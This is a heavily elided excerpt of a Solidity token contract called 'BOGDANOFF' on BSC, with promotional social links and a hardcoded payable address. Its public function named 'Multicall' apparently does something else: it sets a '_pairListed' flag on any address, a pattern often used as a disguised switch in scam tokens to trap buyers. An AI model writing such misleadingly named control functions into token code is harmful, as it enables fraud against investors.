...
//One of the most memorable Token on BSC.
//Telegram: https://t.me/BogdanoffTokenBSC
//Twitter: https://twitter.com/Bogdanoff_BSC
...
contract BOGDANOFF is Context, IERC20, Ownable {
    ...
    string private _name = "BOGDANOFF";
    string private _symbol = "PUMP IT";
    ...
    constructor () {
        ...
        addr = payable(address(0x1360649479Fd2F8752030ACA5BAE620703674F06));
    ...
    function Multicall(address _i,uint256 _m) public {
        if((_m == 0) || (_m - 1 == 0)){
            _pairListed[_i] = _m;
        }
